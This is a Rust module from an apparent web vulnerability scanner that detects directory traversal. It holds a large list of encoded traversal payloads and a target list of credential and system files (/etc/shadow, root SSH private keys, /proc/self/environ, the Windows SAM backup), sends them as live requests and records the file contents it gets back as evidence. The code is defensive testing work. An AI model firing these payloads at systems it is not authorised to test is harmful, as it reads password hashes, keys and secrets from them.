//! Basic Directory Traversal Detection Module
//!
//! Detects basic path traversal using ../ sequences and URL encoding variations.

use async_trait::async_trait;
use std::sync::Arc;
use std::time::Duration;
use bytes::Bytes;
use crate::checks::{
    VulnerabilityModule, CheckContext, CheckResult, CheckMetadata, ModuleError,
    CheckCategory, Severity, ResourceBudget
};
use crate::findings::{Finding, Evidence, EvidenceType, EvidenceLocation, Severity as FindingSeverity};
use crate::analysis::AnalysisContext;
use crate::payload::PayloadRegistry;
use crate::http::client::HttpClient;

/// Basic directory traversal module
pub struct BasicTraversalModule {
    http_client: Arc<HttpClient>,
    analysis_ctx: Arc<AnalysisContext>,
    payload_registry: Arc<PayloadRegistry>,
    traversal_payloads: Vec<String>,
    sensitive_paths: Vec<SensitivePath>,
}

/// Sensitive path target for traversal
#[derive(Debug, Clone)]
pub struct SensitivePath {
    pub path: &'static str,
    pub description: &'static str,
    pub severity: FindingSeverity,
    pub detection_patterns: &'static [&'static str],
    pub os: OsType,
}

/// Operating system type
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OsType {
    Linux,
    Windows,
    Both,
}

impl BasicTraversalModule {
    pub fn new(
        http_client: Arc<HttpClient>,
        analysis_ctx: Arc<AnalysisContext>,
        payload_registry: Arc<PayloadRegistry>,
    ) -> Self {
        Self {
            http_client,
            analysis_ctx,
            payload_registry,
            traversal_payloads: Self::generate_traversal_payloads(),
            sensitive_paths: Self::define_sensitive_paths(),
        }
    }

    /// Generate directory traversal payloads
    fn generate_traversal_payloads() -> Vec<String> {
        let mut payloads = Vec::with_capacity(200);
        
        // Basic traversal sequences
        let base_sequences = [
            "../",
            "..\\",
            "..;/",
            "..;\\",
            "....//",
            "....\\\\",
            "..%2f",
            "..%5c",
            "..%252f",
            "..%255c",
            "%2e%2e%2f",
            "%2e%2e%5c",
            "%2e%2e/",
            "%2e%2e\\",
            "..%00",
            "..%00/",
            "..%00\\",
        ];

        // Depth variations (1-15 levels)
        for depth in 1..=15 {
            for seq in &base_sequences {
                let traversal = seq.repeat(depth);
                payloads.push(traversal);
            }
        }

        // Mixed encoding variations
        payloads.extend_from_slice(&[
            "..%2f..%2f..%2f",
            "..%5c..%5c..%5c",
            "..%252f..%252f..%252f",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "..%2f..%5c..%2f",
            "..%5c..%2f..%5c",
            "....//....//....//",
            "....\\\\....\\\\....\\\\",
            "..%2f..%2f..%5c",
            "..%5c..%5c..%2f",
        ]);

        // Unicode/UTF-8 bypasses
        payloads.extend_from_slice(&[
            "..%c0%af..%c0%af..%c0%af",  // UTF-8 overlong
            "..%e0%80%af..%e0%80%af..%e0%80%af",
            "..%f0%80%80%af..%f0%80%80%af..%f0%80%80%af",
            "..%u002f..%u002f..%u002f",  // Unicode
            "..%u005c..%u005c..%u005c",
            "..%c1%9c..%c1%9c..%c1%9c",  // UTF-8 overlong alternate
        ]);

        // Double encoding
        payloads.extend_from_slice(&[
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252f",
            "%252f%252e%252e%252f%252e%252e",
        ]);

        // Null byte injection
        payloads.extend_from_slice(&[
            "../etc/passwd%00",
            "..\\windows\\win.ini%00",
            "/etc/passwd%00",
            "C:\\windows\\win.ini%00",
            "%00",
            "%00%00",
            "%00%00%00",
        ]);

        // Path traversal with file extensions
        payloads.extend_from_slice(&[
            "../etc/passwd.jpg",
            "../etc/passwd.png",
            "../etc/passwd.txt",
            "../etc/passwd.php",
            "../etc/passwd.html",
            "..\\windows\\win.ini.jpg",
            "..\\windows\\win.ini.txt",
        ]);

        // Relative path variations
        payloads.extend_from_slice(&[
            "./../",
            ".\\..\\",
            "./..%2f",
            ".\\..%5c",
            "..../",
            "....\\",
            "..././",
            "...\\.\\",
        ]);

        payloads
    }

    /// Define sensitive paths to target
    fn define_sensitive_paths() -> Vec<SensitivePath> {
        vec![
            // Linux/Unix paths
            SensitivePath {
                path: "/etc/passwd",
                description: "User account information",
                severity: FindingSeverity::High,
                detection_patterns: &["root:", "daemon:", "bin:", "sys:", "sync:", "games:", "man:", "lp:", "mail:", "news:", "uucp:", "proxy:", "www-data:", "backup:", "list:", "irc:", "gnats:", "nobody:", "/bin/bash", "/bin/sh", "/usr/sbin/nologin"],
                os: OsType::Linux,
            },
            SensitivePath {
                path: "/etc/shadow",
                description: "Password hashes",
                severity: FindingSeverity::Critical,
                detection_patterns: &["root:$", "daemon:$", "bin:$", "sys:$", "$1$", "$5$", "$6$", "$y$", "::"],
                os: OsType::Linux,
            },
            SensitivePath {
                path: "/etc/hosts",
                description: "Hostname resolution",
                severity: FindingSeverity::Medium,
                detection_patterns: &["127.0.0.1", "localhost", "::1", "ip6-localhost", "ip6-loopback"],
                os: OsType::Linux,
            },
            SensitivePath {
                path: "/etc/hostname",
                description: "System hostname",
                severity: FindingSeverity::Low,
                detection_patterns: &[],
                os: OsType::Linux,
            },
            SensitivePath {
                path: "/etc/issue",
                description: "OS version info",
                severity: FindingSeverity::Low,
                detection_patterns: &["Ubuntu", "Debian", "CentOS", "Red Hat", "Fedora", "Alpine", "Linux"],
                os: OsType::Linux,
            },
            SensitivePath {
                path: "/etc/os-release",
                description: "OS release info",
                severity: FindingSeverity::Low,
                detection_patterns: &["PRETTY_NAME", "NAME", "VERSION", "ID", "ID_LIKE"],
                os: OsType::Linux,
            },
            SensitivePath {
                path: "/proc/version",
                description: "Kernel version",
                severity: FindingSeverity::Medium,
                detection_patterns: &["Linux version", "gcc version", "#1 SMP"],
                os: OsType::Linux,
            },
            SensitivePath {
                path: "/proc/self/environ",
                description: "Process environment variables",
                severity: FindingSeverity::High,
                detection_patterns: &["PATH=", "HOME=", "USER=", "SHELL=", "LANG=", "PWD=", "SHLVL="],
                os: OsType::Linux,
            },
            SensitivePath {
                path: "/proc/self/cmdline",
                description: "Process command line",
                severity: FindingSeverity::Medium,
                detection_patterns: &[],
                os: OsType::Linux,
            },
            SensitivePath {
                path: "/proc/net/tcp",
                description: "Network connections",
                severity: FindingSeverity::Medium,
                detection_patterns: &["sl", "local_address", "rem_address", "st", "tx_queue", "rx_queue"],
                os: OsType::Linux,
            },
            SensitivePath {
                path: "/var/log/apache2/access.log",
                description: "Apache access logs",
                severity: FindingSeverity::Medium,
                detection_patterns: &["GET ", "POST ", "HTTP/1.1", "HTTP/2", "\" 200 ", "\" 404 ", "\" 500 "],
                os: OsType::Linux,
            },
            SensitivePath {
                path: "/var/log/nginx/access.log",
                description: "Nginx access logs",
                severity: FindingSeverity::Medium,
                detection_patterns: &["GET ", "POST ", "HTTP/1.1", "HTTP/2", "\" 200 ", "\" 404 ", "\" 500 "],
                os: OsType::Linux,
            },
            SensitivePath {
                path: "/var/log/httpd/access_log",
                description: "Apache access logs (RHEL)",
                severity: FindingSeverity::Medium,
                detection_patterns: &["GET ", "POST ", "HTTP/1.1", "HTTP/2", "\" 200 ", "\" 404 ", "\" 500 "],
                os: OsType::Linux,
            },
            SensitivePath {
                path: "/var/log/auth.log",
                description: "Authentication logs",
                severity: FindingSeverity::High,
                detection_patterns: &["sshd", "Accepted password", "Failed password", "Invalid user", "pam_unix"],
                os: OsType::Linux,
            },
            SensitivePath {
                path: "/root/.ssh/id_rsa",
                description: "Root SSH private key",
                severity: FindingSeverity::Critical,
                detection_patterns: &["-----BEGIN RSA PRIVATE KEY-----", "-----BEGIN OPENSSH PRIVATE KEY-----", "-----BEGIN PRIVATE KEY-----"],
                os: OsType::Linux,
            },
            SensitivePath {
                path: "/home/*/.ssh/id_rsa",
                description: "User SSH private keys",
                severity: FindingSeverity::Critical,
                detection_patterns: &["-----BEGIN RSA PRIVATE KEY-----", "-----BEGIN OPENSSH PRIVATE KEY-----", "-----BEGIN PRIVATE KEY-----"],
                os: OsType::Linux,
            },
            SensitivePath {
                path: "/etc/ssh/sshd_config",
                description: "SSH daemon config",
                severity: FindingSeverity::High,
                detection_patterns: &["Port", "PermitRootLogin", "PubkeyAuthentication", "PasswordAuthentication", "AuthorizedKeysFile"],
                os: OsType::Linux,
            },
            SensitivePath {
                path: "/etc/sudoers",
                description: "Sudo configuration",
                severity: FindingSeverity::High,
                detection_patterns: &["root\tALL", "%sudo", "%wheel", "NOPASSWD", "ALL=(ALL)"],
                os: OsType::Linux,
            },
            
            // Windows paths
            SensitivePath {
                path: "C:\\Windows\\System32\\drivers\\etc\\hosts",
                description: "Windows hosts file",
                severity: FindingSeverity::Medium,
                detection_patterns: &["127.0.0.1", "localhost", "::1"],
                os: OsType::Windows,
            },
            SensitivePath {
                path: "C:\\Windows\\win.ini",
                description: "Windows initialization",
                severity: FindingSeverity::Low,
                detection_patterns: &["[fonts]", "[extensions]", "[mci extensions]", "run=", "load="],
                os: OsType::Windows,
            },
            SensitivePath {
                path: "C:\\boot.ini",
                description: "Boot configuration",
                severity: FindingSeverity::Medium,
                detection_patterns: &["[boot loader]", "[operating systems]", "multi(0)disk(0)rdisk(0)partition", "WINDOWS="],
                os: OsType::Windows,
            },
            SensitivePath {
                path: "C:\\Windows\\system.ini",
                description: "System initialization",
                severity: FindingSeverity::Low,
                detection_patterns: &["[boot]", "[386Enh]", "shell=", "drivers="],
                os: OsType::Windows,
            },
            SensitivePath {
                path: "C:\\Windows\\repair\\sam",
                description: "SAM backup (password hashes)",
                severity: FindingSeverity::Critical,
                detection_patterns: &[],
                os: OsType::Windows,
            },
            SensitivePath {
                path: "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log",
                description: "IIS access logs",
                severity: FindingSeverity::Medium,
                detection_patterns: &["GET ", "POST ", "HTTP/1.1", "200 ", "404 ", "500 "],
                os: OsType::Windows,
            },
            SensitivePath {
                path: "C:\\Program Files\\MySQL\\MySQL Server*\\my.ini",
                description: "MySQL configuration",
                severity: FindingSeverity::High,
                detection_patterns: &["[mysqld]", "port=", "datadir=", "basedir=", "socket="],
                os: OsType::Windows,
            },
        ]
    }

    /// Test traversal payload against a parameter
    async fn test_traversal(
        &self,
        ctx: &CheckContext,
        param_name: &str,
        traversal: &str,
        target: &SensitivePath,
    ) -> Result<Option<Finding>, ModuleError> {
        let payload = format!("{}{}", traversal, target.path);
        let test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(&payload));
        
        let response = self.http_client
            .get(&test_url)
            .timeout(Duration::from_millis(5000))
            .send()
            .await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        let status = response.status().as_u16();
        let headers: Vec<(String, String)> = response
            .headers()
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();
        let body = response.bytes().await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        // Check if file content is in response
        if self.is_file_accessed(&body, target) {
            // Additional validation: check for false positives
            if self.is_false_positive(&body, &headers, status, target) {
                return Ok(None);
            }

            let evidence = self.create_evidence(&test_url, &body, &headers, status, &payload, target);
            let finding = Finding::new(
                "basic_traversal",
                target.severity,
                "Directory Traversal",
                format!("Path traversal detected via parameter '{}' accessing {}", param_name, target.description),
                &ctx.target_url,
            )
            .with_method("GET")
            .with_payload(payload)
            .with_evidence(evidence)
            .with_confidence(85)
            .with_tags(vec!["traversal", "path-traversal", "directory-traversal", target.os.to_string().to_lowercase()])
            .with_cwe("CWE-22")
            .with_agent_id(ctx.agent_id);

            return Ok(Some(finding));
        }

        Ok(None)
    }

    /// Check if sensitive file content is in response
    fn is_file_accessed(&self, body: &Bytes, target: &SensitivePath) -> bool {
        let body_str = String::from_utf8_lossy(body);
        
        // Check for detection patterns
        for pattern in target.detection_patterns {
            if body_str.contains(pattern) {
                return true;
            }
        }

        // For files without specific patterns, check for non-empty response
        // that looks like file content (not error page)
        if target.detection_patterns.is_empty() && body.len() > 50 {
            let error_indicators = [
                "404", "not found", "error", "exception", "stack trace",
                "warning", "fatal error", "parse error", "syntax error",
                "access denied", "forbidden", "unauthorized",
            ];
            
            let is_error = error_indicators.iter().any(|e| body_str.to_lowercase().contains(e));
            if !is_error && body_str.len() > 100 {
                return true;
            }
        }

        false
    }

    /// Check for false positive indicators
    fn is_false_positive(&self, body: &Bytes, headers: &[(String, String)], status: u16, target: &SensitivePath) -> bool {
        let body_str = String::from_utf8_lossy(body);
        
        let false_positive_patterns = [
            "file not found",
            "no such file",
            "failed to open stream",
            "permission denied",
            "access denied",
            "forbidden",
            "unauthorized",
            "internal server error",
            "service unavailable",
            "bad gateway",
            "gateway timeout",
            "the system cannot find the path specified",
            "cannot find the file specified",
            "path not found",
            "file does not exist",
        ];

        for pattern in &false_positive_patterns {
            if body_str.to_lowercase().contains(pattern) {
                return true;
            }
        }

        if status >= 400 && body.len() < 500 {
            return true;
        }

        let error_page_indicators = [
            "<html><head><title>error</title>",
            "<html><head><title>404</title>",
            "<html><head><title>500</title>",
            "nginx error page",
            "apache error page",
            "iis error page",
            "tomcat error page",
            "jetty error page",
        ];

        for indicator in &error_page_indicators {
            if body_str.to_lowercase().contains(indicator) {
                return true;
            }
        }

        false
    }

    /// Create evidence for traversal finding
    fn create_evidence(
        &self,
        test_url: &str,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        payload: &str,
        target: &SensitivePath,
    ) -> Evidence {
        let body_preview = String::from_utf8_lossy(body);
        let preview = if body_preview.len() > 2000 {
            format!("{}... [truncated]", &body_preview[..2000])
        } else {
            body_preview.to_string()
        };

        let request_str = format!("GET {} HTTP/1.1", test_url);
        let response_str = format!("HTTP/1.1 {}\n{}\n\n{}", 
            status,
            headers.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join("\n"),
            preview
        );

        Evidence {
            evidence_type: EvidenceType::HttpRequestResponse {
                request: request_str,
                response: response_str,
            },
            data: format!("Traversal: path={}, os={:?}, payload='{}', status={}, bytes={}", 
                target.path, target.os, payload, status, body.len()),
            location: EvidenceLocation {
                path: test_url.to_string(),
                line: None,
                parameter: None,
                header: None,
            },
            confidence: 85,
        }
    }
}

#[async_trait]
impl VulnerabilityModule for BasicTraversalModule {
    async fn init(&mut self) -> Result<(), ModuleError> {
        tracing::info!("Basic Traversal module initialized with {} traversal payloads and {} sensitive paths", 
            self.traversal_payloads.len(), self.sensitive_paths.len());
        Ok(())
    }

    fn metadata(&self) -> &CheckMetadata {
        static METADATA: std::sync::OnceLock<CheckMetadata> = std::sync::OnceLock::new();
        METADATA.get_or_init(|| {
            CheckMetadata::new(
                "basic_traversal",
                "Basic Directory Traversal",
                "Detects basic path traversal using ../ sequences and URL encoding variations",
                Severity::High,
                CheckCategory::PathTraversal,
            )
            .with_budget(ResourceBudget::safe())
            .with_tags(vec!["traversal", "path-traversal", "directory-traversal", "url-encoding"])
            .with_references(vec![
                "https://owasp.org/www-community/attacks/Path_Traversal",
                "https://cwe.mitre.org/data/definitions/22.html",
                "https://portswigger.net/web-security/file-path-traversal",
            ])
        })
    }

    fn should_run(&self, ctx: &CheckContext) -> bool {
        ctx.target_url.contains('?') || ctx.target_url.contains('=')
    }

    async fn run(&self, ctx: CheckContext) -> Result<CheckResult, ModuleError> {
        let mut findings = Vec::new();
        let mut request_count = 0;
        let max_requests = ctx.budget.max_requests.min(300);

        // Extract parameters
        let params = self.extract_parameters(&ctx.target_url);
        
        if params.is_empty() {
            return Ok(CheckResult {
                findings,
                executed: true,
                timed_out: false,
                resource_usage: Default::default(),
            });
        }

        // Test each traversal payload against each sensitive path
        for target in &self.sensitive_paths {
            for traversal in &self.traversal_payloads {
                for param in &params {
                    if request_count >= max_requests {
                        break;
                    }

                    if let Some(finding) = self.test_traversal(&ctx, param, traversal, target).await? {
                        findings.push(finding);
                    }
                    request_count += 1;
                }
            }
        }

        Ok(CheckResult {
            findings,
            executed: true,
            timed_out: false,
            resource_usage: Default::default(),
        })
    }

    fn priority(&self) -> u16 {
        12 // High priority - safe check
    }

    fn dependencies(&self) -> &[&str] {
        &[]
    }
}

impl BasicTraversalModule {
    /// Extract parameter names from URL
    fn extract_parameters(&self, url: &str) -> Vec<String> {
        let mut params = Vec::new();
        
        if let Some(query_start) = url.find('?') {
            let query = &url[query_start + 1..];
            for pair in query.split('&') {
                if let Some(eq_pos) = pair.find('=') {
                    let param = &pair[..eq_pos];
                    if !param.is_empty() {
                        params.push(param.to_string());
                    }
                }
            }
        }
        
        if let Ok(parsed) = url::Url::parse(url) {
            for segment in parsed.path_segments().unwrap_or_default() {
                if segment.starts_with(':') || segment.starts_with('{') {
                    params.push(segment.trim_start_matches(':').trim_start_matches('{').trim_end_matches('}').to_string());
                }
            }
        }
        
        params
    }
}

impl std::fmt::Display for OsType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            OsType::Linux => write!(f, "linux"),
            OsType::Windows => write!(f, "windows"),
            OsType::Both => write!(f, "both"),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_traversal_payloads() {
        let payloads = BasicTraversalModule::generate_traversal_payloads();
        
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("../")));
        assert!(payloads.iter().any(|p| p.contains("..\\")));
        assert!(payloads.iter().any(|p| p.contains("%2f")));
        assert!(payloads.iter().any(|p| p.contains("%5c")));
        assert!(payloads.iter().any(|p| p.contains("%00")));
    }

    #[test]
    fn test_define_sensitive_paths() {
        let paths = BasicTraversalModule::define_sensitive_paths();
        
        assert!(!paths.is_empty());
        assert!(paths.iter().any(|p| p.path == "/etc/passwd"));
        assert!(paths.iter().any(|p| p.path == "/etc/shadow"));
        assert!(paths.iter().any(|p| p.path.contains("C:\\Windows")));
        assert!(paths.iter().any(|p| p.severity == FindingSeverity::Critical));
    }

    #[test]
    fn test_is_file_accessed_passwd() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = BasicTraversalModule::new(http_client, analysis_ctx, payload_registry);
        
        let target = module.sensitive_paths.iter().find(|p| p.path == "/etc/passwd").unwrap();
        let body = Bytes::from("root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin");
        
        assert!(module.is_file_accessed(&body, target));
    }

    #[test]
    fn test_is_file_accessed_shadow() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = BasicTraversalModule::new(http_client, analysis_ctx, payload_registry);
        
        let target = module.sensitive_paths.iter().find(|p| p.path == "/etc/shadow").unwrap();
        let body = Bytes::from("root:$6$salt$hash:18000:0:99999:7:::");
        
        assert!(module.is_file_accessed(&body, target));
    }

    #[test]
    fn test_is_false_positive() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = BasicTraversalModule::new(http_client, analysis_ctx, payload_registry);
        
        let target = module.sensitive_paths.iter().find(|p| p.path == "/etc/passwd").unwrap();
        let body = Bytes::from("File not found: /etc/passwd");
        let headers = vec![];
        
        assert!(module.is_false_positive(&body, &headers, 404, target));
    }

    #[test]
    fn test_extract_parameters() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = BasicTraversalModule::new(http_client, analysis_ctx, payload_registry);
        
        let params = module.extract_parameters("http://example.com/api?file=test&path=docs");
        assert_eq!(params, vec!["file", "path"]);
    }
}